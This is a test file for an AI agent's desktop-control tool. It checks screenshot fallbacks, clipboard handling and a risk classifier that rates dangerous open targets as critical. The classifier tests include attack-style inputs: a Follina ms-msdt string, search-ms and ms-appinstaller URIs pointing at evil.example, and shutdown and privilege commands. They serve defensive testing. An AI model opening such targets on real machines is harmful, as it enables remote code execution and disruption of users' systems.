/**
 * Desktop control — fixes salvaged from a desktop reviewer's stranded working
 * tree (b5a8e06) that HEAD did not already have in another form:
 *   - X11 full-screen capture uses the first screenshot tool that WORKS, not
 *     the first one installed (a broken scrot no longer blocks `import`);
 *   - so does Wayland (grim is often installed where the compositor can't
 *     serve it: GNOME, KDE);
 *   - the Wayland clipboard is read as a TEXT type (`wl-paste` alone prints a
 *     copied image's PNG bytes);
 *   - Wayland screen_info notes that ydotool types through the active
 *     keyboard layout (ASCII comes out wrong under a Persian layout);
 *   - the Windows paste script restores the old clipboard in a `finally`
 *     (with ErrorActionPreference Stop a throwing SendWait skipped it);
 *   - Sentinel judges computer_use_open of code-running targets critical:
 *     RCE-prone protocol handlers (ms-msdt, search-ms, its:, ...), commands
 *     that act when merely launched (poweroff, logoff, ...) and more
 *     executable file types (.tool, .run, .msc, .appref-ms, ...).
 * Fakes only (setDesktopExec) — no real input.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { promises as fs, existsSync } from 'fs';
import * as path from 'path';
import * as os from 'os';
import { setDesktopExec, type ExecOptions, type ExecResult } from '../src/tools/computer/exec.js';
import { X11Backend, WaylandBackend, WindowsBackend, type BackendDeps } from '../src/tools/computer/backends/index.js';
import { pickTextMime } from '../src/tools/computer/backends/wayland.js';
import { decodePowerShellStdin } from '../src/tools/computer/backends/windows.js';
import { classifyAction } from '../src/sentinel/policy.js';
import { DEFAULT_SENTINEL_CONFIG } from '../src/config/agent-config.js';

interface Call { cmd: string; args: string[]; opts?: ExecOptions }
type Responder = (c: Call) => Partial<ExecResult> | void | Promise<Partial<ExecResult> | void>;

/** Fake runner: records calls, behaves like the real one on abort (code 130, nothing runs). */
function fakeExec(responder?: Responder, missing: string[] = []) {
  const calls: Call[] = [];
  setDesktopExec({
    run: async (cmd, args, opts) => {
      if (opts?.signal?.aborted) return { stdout: '', stderr: 'aborted', code: 130 };
      const c = { cmd, args, opts };
      calls.push(c);
      return { stdout: '', stderr: '', code: 0, ...((await responder?.(c)) ?? {}) };
    },
    which: async (cmd) => (missing.includes(cmd) ? null : `/usr/bin/${cmd}`),
  });
  return calls;
}

/** Minimal PNG header with the given size (enough for size sniffing). */
function png(w: number, h: number): Buffer {
  const b = Buffer.alloc(33);
  b.writeUInt32BE(0x89504e47, 0);
  b.writeUInt32BE(0x0d0a1a0a, 4);
  b.writeUInt32BE(13, 8);
  b.write('IHDR', 12, 'ascii');
  b.writeUInt32BE(w, 16);
  b.writeUInt32BE(h, 20);
  return b;
}

const deps = (over: Partial<BackendDeps> = {}): BackendDeps => ({
  env: { DISPLAY: ':0', LANG: 'C' },
  platform: 'linux',
  inputDelayMs: 40,
  osRelease: 'ID=ubuntu\nID_LIKE=debian\n',
  ...over,
});

let tmp: string;
beforeEach(async () => { tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'qx-salvage-desk-')); });
afterEach(async () => {
  setDesktopExec(null);
  await fs.rm(tmp, { recursive: true, force: true });
});

// ─────────────────────────────────────────────────────────────────────────────

describe('x11: full-screen capture falls back to the next screenshot tool that works', () => {
  it('a failing scrot (leaving a partial file) falls back to import', async () => {
    const dest = path.join(tmp, 'shot.png');
    const seenBeforeImport: boolean[] = [];
    const calls = fakeExec(async c => {
      if (c.cmd === 'scrot') {
        await fs.writeFile(c.args[0]!, 'junk');
        return { code: 1, stderr: "giblib error: Can't grab X display." };
      }
      if (c.cmd === 'import') {
        seenBeforeImport.push(existsSync(c.args[2]!));
        await fs.writeFile(c.args[2]!, png(1280, 1024));
      }
    }, ['magick', 'convert']);
    const shot = await new X11Backend(deps()).screenshot({ path: dest });
    expect(calls.map(c => [c.cmd, ...c.args])).toEqual([
      ['scrot', dest],
      ['import', '-window', 'root', dest],
    ]);
    expect(seenBeforeImport).toEqual([false]); // the failed attempt's partial file was removed first
    expect(shot).toMatchObject({ path: dest, width: 1280, height: 1024, scale: 1 });
  });

  it('when every tool fails, the last tool\'s error is reported', async () => {
    fakeExec(c => ({ code: 1, stderr: `${c.cmd} broke` }), ['magick', 'convert']);
    await expect(new X11Backend(deps()).screenshot({ path: path.join(tmp, 's.png') }))
      .rejects.toThrow(/^\[COMPUTER_USE_ERROR\] x11: gnome-screenshot exited 1: gnome-screenshot broke/);
  });

  it('a cancelled capture stops instead of trying the next tool', async () => {
    const ac = new AbortController();
    const calls = fakeExec(c => {
      if (c.cmd === 'scrot') { ac.abort(); return { code: 130, stderr: 'aborted' }; }
    });
    await expect(new X11Backend(deps({ signal: ac.signal })).screenshot({ path: path.join(tmp, 's.png') }))
      .rejects.toThrow(/^\[ABORTED\]/);
    expect(calls.map(c => c.cmd)).toEqual(['scrot']);
  });
});

describe('wayland: screenshots fall back to the next tool that works', () => {
  const wl = (env: NodeJS.ProcessEnv = { WAYLAND_DISPLAY: 'wayland-0' }, over: Partial<BackendDeps> = {}) =>
    new WaylandBackend(deps({ env, ...over }));
  const NO_SCREENCOPY = { code: 1, stderr: "compositor doesn't support wlr-screencopy-unstable-v1" };

  it('grim on a compositor without wlr-screencopy (GNOME) falls back to gnome-screenshot', async () => {
    const dest = path.join(tmp, 'shot.png');
    const calls = fakeExec(async c => {
      if (c.cmd === 'grim') return NO_SCREENCOPY;
      if (c.cmd === 'gnome-screenshot') await fs.writeFile(c.args[1]!, png(1920, 1080));
    }, ['swaymsg', 'hyprctl', 'magick', 'convert']);
    const shot = await wl().screenshot({ path: dest });
    expect(calls.map(c => [c.cmd, ...c.args])).toEqual([
      ['grim', '-s', '1', dest],
      ['grim', dest],
      ['gnome-screenshot', '-f', dest],
    ]);
    expect(shot).toMatchObject({ path: dest, width: 1920, height: 1080, origin: { x: 0, y: 0 } });
  });

  it('a window region the fallback tool can\'t capture → full screen, origin 0,0, and the size is cached', async () => {
    const tree = JSON.stringify({ type: 'root', nodes: [{ type: 'output', nodes: [{ type: 'workspace', nodes: [
      { type: 'con', id: 9, name: 'foot', app_id: 'foot', pid: 11, focused: true, rect: { x: 960, y: 0, width: 960, height: 1080 } },
    ] }] }] });
    const dest = path.join(tmp, 'win.png');
    const calls = fakeExec(async c => {
      if (c.cmd === 'swaymsg') return { stdout: c.args.includes('get_tree') ? tree : '[]' };
      if (c.cmd === 'grim') return NO_SCREENCOPY;
      if (c.cmd === 'gnome-screenshot') await fs.writeFile(c.args[1]!, png(2000, 1000));
    }, ['hyprctl', 'magick', 'convert']);
    const b = wl({ WAYLAND_DISPLAY: 'wayland-1', SWAYSOCK: '/run/sway.sock' });
    const shot = await b.screenshot({ path: dest, window: 'foot' });
    expect(calls.filter(c => c.cmd === 'grim')[0]!.args).toEqual(['-s', '1', '-g', '960,0 960x1080', dest]);
    expect(shot.origin).toEqual({ x: 0, y: 0 });
    expect(shot.notes.join(' ')).toMatch(/gnome-screenshot can't capture a region; captured the full screen/);
    // It was a full-screen image after all: screenSize() can use it (no throwaway capture).
    const before = calls.length;
    expect(await b.screenSize()).toEqual({ width: 2000, height: 1000 });
    expect(calls.slice(before).map(c => c.cmd)).toEqual(['swaymsg']);
  });

  it('a cancelled capture stops instead of trying the next tool', async () => {
    const ac = new AbortController();
    const calls = fakeExec(c => {
      if (c.cmd === 'grim') { ac.abort(); return { code: 130, stderr: 'aborted' }; }
    }, ['swaymsg', 'hyprctl']);
    await expect(wl(undefined, { signal: ac.signal }).screenshot({ path: path.join(tmp, 's.png') })).rejects.toThrow(/^\[ABORTED\]/);
    expect(calls.map(c => c.cmd)).toEqual(['grim']);
  });
});

describe('windows: the paste script restores the old clipboard even when the paste throws', () => {
  it('SetText / SendWait run in a try whose finally holds the restore', async () => {
    const calls = fakeExec();
    expect((await new WindowsBackend(deps({ env: {}, platform: 'win32' })).type('سلام', { method: 'paste' })).method).toBe('paste');
    // The loader runs with ErrorActionPreference Stop: an exception ends the script at once,
    // and the saved clipboard ($oldText / $oldImage / $oldFiles) exists only inside it.
    expect(calls[0]!.opts!.stdin!).toContain("$ErrorActionPreference = 'Stop'");
    const s = decodePowerShellStdin(calls[0]!.opts!.stdin!)!;
    const at = (needle: string, from = 0) => {
      const i = s.indexOf(needle, from);
      expect(i, needle).toBeGreaterThanOrEqual(0);
      return i;
    };
    const saved = at('GetFileDropList()');
    const setText = at("SetText('سلام')", saved);
    const tryAt = s.lastIndexOf('try {', setText);
    const fin = at('} finally {', setText);
    expect(tryAt).toBeGreaterThan(saved); // the old contents are saved before the guarded block
    expect(at("SendWait('^v')", setText)).toBeLessThan(fin);
    for (const restore of ['SetText($oldText)', 'SetImage($oldImage)', 'SetFileDropList($oldFiles)', '[System.Windows.Forms.Clipboard]::Clear()']) {
      expect(at(restore, setText), restore).toBeGreaterThan(fin);
    }
  });
});

describe('Sentinel: computer_use_open targets that run code are critical', () => {
  const open = (target: string) => classifyAction('computer_use_open', { target }, { config: { ...DEFAULT_SENTINEL_CONFIG } });
  const expectCritical = (target: string) => {
    const c = open(target);
    expect(c.risk, target).toBe('critical');
    expect(c.category, target).toBe('other');
    expect(c.block, target).toBeUndefined(); // a human can still allow it
  };

  it('protocol handlers with a code-execution history (Follina ms-msdt, search-ms, CHM its:/mk:, ...) — not just high', () => {
    for (const target of [
      'ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=x"', 'MS-MSDT:/id x',
      'search-ms:query=invoice&crumb=location:\\\\evil.example\\share', 'search:query=x',
      'ms-officecmd:{"id":3}', 'ms-appinstaller:?source=https://evil.example/x.appinstaller', 'ms-cxh-full://0',
      'its:C:\\x.chm::/a.htm', 'ms-its:C:\\x.chm::/a.htm', 'mk:@MSITStore:C:\\x.chm::/a.htm', 'hcp://services/search?query=x',
    ]) expectCritical(target);
    // other protocol handlers keep their (high) desktop review; web pages stay medium
    expect(open('ms-settings:privacy')).toMatchObject({ category: 'desktop', risk: 'high' });
    expect(open('steam://run/10')).toMatchObject({ category: 'desktop', risk: 'high' });
    expect(open('https://example.com/search?q=x')).toMatchObject({ category: 'desktop', risk: 'medium' });
  });

  it('power / session / kill / privilege commands launched by name or path', () => {
    for (const target of [
      'poweroff', 'reboot', 'shutdown', 'logoff', 'LOGOFF.EXE', 'tsdiscon', 'gnome-session-quit', 'xkill', 'pkexec',
      '/sbin/poweroff', 'C:\\Windows\\System32\\shutdown.exe', 'file:///usr/sbin/reboot',
    ]) expectCritical(target);
    for (const target of ['Calculator', 'firefox', 'gnome-calculator', 'notepad', 'Visual Studio Code', '/tmp/notes.txt']) {
      expect(open(target)).toMatchObject({ category: 'desktop', risk: 'medium' });
    }
  });

  it('more file types the default handler executes', () => {
    for (const target of [
      '~/Downloads/x.tool', '/tmp/x.terminal', 'a.workflow', 'b.action', '/tmp/NVIDIA-Linux-x86_64.run', 'setup.bin',
      'evil.bash', 'x.zsh', 'x.fish', 'm.psm1', 'p.wsh', 'patch.msp', 'app.application', 'app.appref-ms',
      'x.settingcontent-ms', 'x.msc', 'x.inf', 'x.scf', 'x.gadget', 'file:///tmp/x.tool',
    ]) expectCritical(target);
  });

  it('on Windows .pyw / .pl / .rb / .url run as well; elsewhere a .pl is just a file', () => {
    expect(open('/tmp/a.pl').risk).not.toBe('critical');
    const real = process.platform;
    Object.defineProperty(process, 'platform', { value: 'win32' });
    try {
      for (const target of ['C:\\x\\a.pyw', 'C:\\x\\a.pl', 'C:\\x\\a.rb', 'C:\\Users\\me\\Desktop\\invoice.url']) expectCritical(target);
    } finally {
      Object.defineProperty(process, 'platform', { value: real });
    }
  });
});

describe('wayland: screen_info warns about the keyboard layout', () => {
  it('ydotool types key codes through the active layout: the notes say so and name the way out', async () => {
    fakeExec(undefined, ['swaymsg', 'hyprctl']);
    const av = await new WaylandBackend(deps({ env: { WAYLAND_DISPLAY: 'wayland-0' } })).available();
    const note = av.notes.find(n => /keyboard layout/i.test(n));
    expect(note).toMatch(/Persian/);
    expect(note).toMatch(/English\/US layout|method "paste"/);
  });
});

describe('wayland: the clipboard is read as text, never as image bytes', () => {
  const wl = () => new WaylandBackend(deps({ env: { WAYLAND_DISPLAY: 'wayland-0' } }));
  const PNG_BYTES = '\x89PNG\r\n\x1a\n\0\0\0\rIHDR';

  it('pickTextMime prefers UTF-8 plain text, accepts X11 atoms, and rejects non-text', () => {
    expect(pickTextMime(['image/png', 'text/plain', 'text/plain;charset=utf-8'])).toBe('text/plain;charset=utf-8');
    expect(pickTextMime(['image/png', 'TEXT', 'UTF8_STRING'])).toBe('UTF8_STRING');
    expect(pickTextMime(['text/plain;charset=ISO-8859-1'])).toBe('text/plain;charset=ISO-8859-1');
    expect(pickTextMime(['image/png', 'image/bmp'])).toBeNull();
    expect(pickTextMime([])).toBeNull();
  });

  it('a copied image reads as "no text" instead of PNG bytes', async () => {
    const calls = fakeExec(c => {
      if (c.cmd !== 'wl-paste') return;
      if (c.args.includes('--list-types')) return { stdout: 'image/png\nimage/bmp\n' };
      return { stdout: PNG_BYTES }; // what a plain `wl-paste` would print
    });
    expect(await wl().clipboardGet()).toBe('');
    expect(calls.map(c => [c.cmd, ...c.args])).toEqual([['wl-paste', '--list-types']]);
  });

  it('text is read with the chosen type; an empty clipboard reads as ""', async () => {
    const calls = fakeExec(c => {
      if (c.args.includes('--list-types')) return { stdout: 'text/html\ntext/plain\nimage/png\n' };
      return { stdout: 'سلام' };
    });
    expect(await wl().clipboardGet()).toBe('سلام');
    expect(calls[1]!.args).toEqual(['--no-newline', '--type', 'text/plain']);
    fakeExec(() => ({ code: 1, stderr: 'Nothing is copied' }));
    expect(await wl().clipboardGet()).toBe('');
  });

  it('a paste over a copied image clears the clipboard afterwards instead of "restoring" PNG bytes as text', async () => {
    const calls = fakeExec(c => {
      if (c.cmd === 'wl-paste') return c.args.includes('--list-types') ? { stdout: 'image/png\n' } : { stdout: PNG_BYTES };
    });
    await wl().type('رمز', { method: 'paste' });
    const copies = calls.filter(c => c.cmd === 'wl-copy');
    expect(copies.map(c => c.args)).toEqual([[], ['--clear']]);
    expect(copies[0]!.opts?.stdin).toBe('رمز');
  });
});
